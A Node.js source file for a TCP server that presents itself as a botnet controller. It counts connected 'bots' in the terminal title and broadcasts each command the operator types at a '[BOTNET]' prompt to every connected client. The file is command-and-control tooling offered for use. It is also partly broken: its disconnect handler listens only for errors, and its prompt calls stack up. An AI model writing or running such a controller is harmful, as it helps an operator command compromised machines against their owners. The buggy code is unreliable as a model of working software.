const net = require("net");
require("dotenv").config({ path: "../config/.env" });

const readline = require("readline").createInterface({
  input: process.stdin,
  output: process.stdout,
});

// Keep track of all clients
const clients = [];
let clientCount = 0;

const PORT = process.env.PORT;
const HOST = process.env.HOST;

function setTerminalTitle() {
  process.stdout.write(
    String.fromCharCode(27) +
      "]0;" +
      `Botnet | Bots: ${clientCount}` +
      String.fromCharCode(7)
  );
}
setTerminalTitle();

// Start a TCP Server
net
  .createServer((socket) => {
    // Identify this client
    socket.name = `${socket.remoteAddress}:${socket.remotePort}`;

    // Put this new client in the list
    clients.push(socket);

    clientCount++;
    console.log(`User ${socket.name} has connected.\n`);

		setTerminalTitle();
    prompt();

    function broadcast(message) {
      clients.forEach((client) => {
        client.write(message);
      });
      process.stdout.write(message);
    }

    function prompt() {
      readline.question("[BOTNET] ", (msg) => {
        broadcast(msg);
				return prompt();
      });
    }

    // Remove the client from the list when it leaves
    function clientDisconnected() {
      clients.splice(clients.indexOf(socket), 1);
      clientCount--;
      console.log(`User ${socket.name} has disconnected.\n`);
      if (clientCount < 1) console.log("Waiting for clients to connect.\n");
      setTerminalTitle();
    }

    socket.on("data", function (data) {
      broadcast(`[CLIENT ${socket.name}]` + data, socket);
      prompt();
    });

    socket.on("error" || "end", () => {
      clientDisconnected();
    });
  })
  .listen(PORT, HOST);

console.log(`Server running on ${HOST}:${PORT}.`);
console.log(`Waiting for connections.\n`);
